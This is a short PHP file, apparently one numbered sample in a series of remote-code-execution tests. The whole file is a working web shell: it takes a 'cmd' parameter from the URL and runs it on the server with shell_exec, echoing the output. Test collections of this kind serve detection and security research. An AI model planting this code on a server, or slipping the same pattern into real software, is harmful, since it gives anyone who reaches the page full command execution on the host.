<?php
// RCE test variation #1160
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>